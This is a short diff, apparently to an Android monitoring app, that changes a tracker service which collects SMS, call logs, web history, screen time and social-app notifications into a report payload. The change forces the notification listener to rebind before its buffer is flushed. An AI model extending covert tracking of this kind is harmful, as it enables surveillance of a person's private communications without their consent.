@@ -319,7 +319,12 @@ class TrackerService : Service() {
             val screentime = collectors.collectScreenTime(context)
             val webHistory = collectors.collectWebHistory(context)
             writeDebugLog("Collected: ${webHistory.size} web entries, ${smsMessages.size} sms, ${callLogs.size} calls")
+
+            // Ensure notification listener service is bound and active
+            SocialNotificationService.ensureRebound(context)
+
             val socialNotifications = SocialNotificationService.flushBuffer()
+
 
             val payload = ApiClient.buildReportPayload(
                 deviceInfo = deviceInfo,
